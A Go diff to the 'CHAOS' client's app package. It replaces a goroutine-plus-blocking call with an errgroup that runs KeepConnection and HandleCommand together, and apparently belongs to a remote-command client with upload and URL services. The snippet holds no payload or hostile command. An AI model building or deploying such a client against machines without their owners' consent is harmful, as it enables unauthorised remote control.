@@ -1,6 +1,7 @@
 package app
 
 import (
+	"context"
 	"github.com/tiagorlampert/CHAOS/client/app/environment"
 	"github.com/tiagorlampert/CHAOS/client/app/gateways/client"
 	"github.com/tiagorlampert/CHAOS/client/app/handler"
@@ -15,6 +16,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/services/upload"
 	"github.com/tiagorlampert/CHAOS/client/app/services/url"
 	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
+	"golang.org/x/sync/errgroup"
 	"log"
 )
 
@@ -54,6 +56,17 @@ func New(configuration *environment.Configuration) *App {
 }
 
 func (a *App) Run() {
-	go a.Handler.KeepConnection()
-	a.Handler.HandleCommand()
+	g, _ := errgroup.WithContext(context.Background())
+
+	g.Go(func() error {
+		a.Handler.KeepConnection()
+		return nil
+	})
+
+	g.Go(func() error {
+		a.Handler.HandleCommand()
+		return nil
+	})
+
+	g.Wait()
 }
